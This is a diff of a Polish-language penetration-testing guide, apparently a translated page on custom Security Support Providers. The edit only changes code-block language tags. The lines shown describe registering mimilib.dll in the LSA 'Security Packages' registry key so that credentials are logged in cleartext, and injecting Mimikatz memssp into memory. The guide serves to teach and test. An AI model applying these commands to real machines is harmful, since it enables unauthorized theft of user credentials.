@@ -19,7 +19,7 @@ HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
 Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
 ```
 Dodaj `mimilib.dll` do listy dostawców wsparcia bezpieczeństwa (Pakiety zabezpieczeń):
-```powershell
+```bash
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
 A po ponownym uruchomieniu wszystkie poświadczenia można znaleźć w czystym tekście w `C:\Windows\System32\kiwissp.log`
@@ -27,7 +27,7 @@ A po ponownym uruchomieniu wszystkie poświadczenia można znaleźć w czystym t
 #### W pamięci
 
 Możesz również wstrzyknąć to bezpośrednio do pamięci za pomocą Mimikatz (zauważ, że może to być trochę niestabilne/nie działać):
-```powershell
+```bash
 privilege::debug
 misc::memssp
 ```
